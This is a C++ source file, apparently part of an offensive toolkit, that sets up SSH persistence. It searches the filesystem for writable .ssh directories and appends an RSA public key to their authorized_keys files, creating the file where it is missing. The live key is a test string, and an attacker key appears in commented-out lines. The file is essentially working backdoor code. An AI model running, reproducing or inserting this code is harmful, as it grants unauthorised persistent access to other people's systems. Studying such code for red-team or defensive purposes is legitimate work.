/* establishing SSH persistence

   This is frankly quite a hackish way of implementing this technique. these routines do not account for authorized_keys files that are found in non-standard locations, and the .ssh folders
   are enumerated by running a shell command and parsing the output instead of using more reliable API calls.

    Tested: Nov. 28, 2024 on Parrot OS and KDE Neon 6.2

 1. enumerate for writable .ssh directories on the system
 2. check those directories for authorized_keys files
 3. if the directory is writable and authorized_keys file exists, write a public key fingerprint to it
 4. if the directory is writable but the authorized_keys file doesn't exist, create it and write to it
 */ 

/*
 * This file currently only appends the key fingerprint to the authorized_keys file if it exists; it DOES NOT yet check if the file is missing in a writable directory and place it there
 * */

#include "run_command.h"
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <filesystem>
#include <sstream>
#include <fstream>

bool create_and_populate_authorized_keys_file(std::string full_path, std::string public_key);
bool write_public_key_fingerprint(std::string target_file, std::string public_key);
bool file_is_writable(std::string file_path);

bool establish_ssh_persistence() {

    // const std::string public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChUkgKBrQo3L+Ras9B+H7Xhxyqb/uQp38d7m1kTxBfXCJUXPH3RhIGTH+JLvupYzFF2oKZCdAtG+wney6x0zmU+T40voSwJBaCgoIIPCmm7UtLr3tC/ozkWL0ON5oYA+ULmcW1e2fCYby6aG9vNWXaqF3HvsWXOwezoUFmQJFWvEb16nTKG5i/gv+RNLLm+mkJ3qdz0tgmy5BHevl1MC1Jj2ADyWHPbdU2vzxe206kpNufBqhoMVVbJBZLFVkObckJEdIkPeGm45gfswD82iil6rHkWUW8+93EYXLOpJt1cz5CAFC49ysy3Epr+EnAZ1YErV225hY7HyJt3j88KX8kx3PH3bVTavVZzG1MsqmuOX0AuBK0FgfSC2hFaXLLfFQBBIx1Yrz1KzMSaxE7c3aWwY3CapoEI1Z5uF2/fygxfzJU38QohkBFNmbfl6lsleRZtMm4EOW7niaBF9oBrFflpL04E8+wIa57RVZTHd4tc1vECyC8/1dwrSSw9FhMrE0= host@computer";                         // this doesn't need compile time obfuscation because it is public

    const std::string public_key = "This means a successful test!";

    int counter { 0 };

	std::string writable_ssh_directories_command = run_command("find / -type d -name .ssh -writable 2>/dev/null");

	std::istringstream stream(writable_ssh_directories_command);
	std::string current_line;
    std::vector<std::string> writable_ssh_directories;
	while (std::getline(stream, current_line)) {
        writable_ssh_directories.push_back(current_line);                       // taking inventory of the writable '.ssh' directories
	}

    if (writable_ssh_directories.size() == 0) {return false;}                       // no opportunity for SSH based persistence
    else {


        /*                  At this point it is known that the directories in writable_ssh_directories are writable
         * 2 conditions to check for:
         *      1. the authorized_keys file exists and is writable
         *      2. the authorized_keys file does not exist (and therefore we can create it)
         * */

        for (int i = 0; i < writable_ssh_directories.size(); i++) {                 // attempting to establish persistence in each writable '.ssh' directory

            std::ostringstream file_path;

            file_path << writable_ssh_directories[i] << "/authorized_keys";         // crafting the absolute path for the authorized_keys file

                if (std::filesystem::exists(file_path.str()) && file_is_writable(file_path.str())) {       // if the authorized_keys file exists and is writable... (condition 1)
                    std::cout << "[+] " << file_path.str() << " file exists and appears appendable" << '\n';
                    std::cout << "[+] Writing our public key fingerprint to the authorized_keys file: " << file_path.str() << '\n';
                    if (write_public_key_fingerprint(file_path.str(), public_key)) {          // this will return true if successful, false upon failure
                        counter++;
                    } else {continue;}

                } else if (!std::filesystem::exists(file_path.str())) {                  // else if the authorized_keys file does not exist but we can create it... (condition 2)

                    std::cout << "[+] " << file_path.str() << " file does not exist but we can create it" << '\n';
                    // std::cout << "[+] Creating the authorized_keys file in an .ssh directory and writing our public key fingerprint to it..." << '\n';
                    if (create_and_populate_authorized_keys_file(file_path.str(), public_key)) {           // as above, this will return true if successful, false otherwise
                        counter++;
                    } else {continue;}

                } else {                                    // handling the rest of the cases for safety
                    std::cout << "[!] Could not establish SSH persistence despite writable .ssh directory! Execution is not supposed to reach here..." << '\n';
                    return false;
                }
        }        

    }

    if (counter > 0) {return true;} else {return false;}      // the counter will be greater than 0 if SSH based persistence has been established, thus the return of true.
}

bool create_and_populate_authorized_keys_file(std::string full_path, std::string public_key) {

    // this function takes the full path to the new authorized_keys as parameter 1, opens the authorized_keys file for writing, and writes the public key fingerprint to the open file

    std::cout << "[+] Opening and injecting public key fingerprint into " << full_path << '\n';

    std::ofstream file(full_path, std::ios::out);
    if (!file.is_open()) {return false;}

    file << public_key;

    file.close();

    std::cout << "[+] Successfully wrote the public key fingerprint into: " << full_path << '\n';

    return true;
}

bool write_public_key_fingerprint(std::string target_file, std::string public_key) {
    // const std::string SSH_PUBLIC_KEY_FINGERPINT = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChUkgKBrQo3L+Ras9B+H7Xhxyqb/uQp38d7m1kTxBfXCJUXPH3RhIGTH+JLvupYzFF2oKZCdAtG+wney6x0zmU+T40voSwJBaCgoIIPCmm7UtLr3tC/ozkWL0ON5oYA+ULmcW1e2fCYby6aG9vNWXaqF3HvsWXOwezoUFmQJFWvEb16nTKG5i/gv+RNLLm+mkJ3qdz0tgmy5BHevl1MC1Jj2ADyWHPbdU2vzxe206kpNufBqhoMVVbJBZLFVkObckJEdIkPeGm45gfswD82iil6rHkWUW8+93EYXLOpJt1cz5CAFC49ysy3Epr+EnAZ1YErV225hY7HyJt3j88KX8kx3PH3bVTavVZzG1MsqmuOX0AuBK0FgfSC2hFaXLLfFQBBIx1Yrz1KzMSaxE7c3aWwY3CapoEI1Z5uF2/fygxfzJU38QohkBFNmbfl6lsleRZtMm4EOW7niaBF9oBrFflpL04E8+wIa57RVZTHd4tc1vECyC8/1dwrSSw9FhMrE0= host@computer";                         // this doesn't need compile time obfuscation because it is public

    // const std::string SSH_PUBLIC_KEY_FINGERPINT = "this is the test value\n";               // placeholder value so there aren't a trillion public key writes

    std::ofstream file(target_file, std::ios::app); if (!file.is_open()) {std::cout << "[!] Failed to write the public key fingerprint!" << '\n'; return false;}

    file << public_key;

    file.close();

    return true;
}

bool file_is_writable(std::string file_path) {                  // when this is called we already know that file_path exists as a file

    std::ofstream file(file_path, std::ios::app);

    if (file.is_open()) {
        return true;
    } else {
        return false;
    }
}
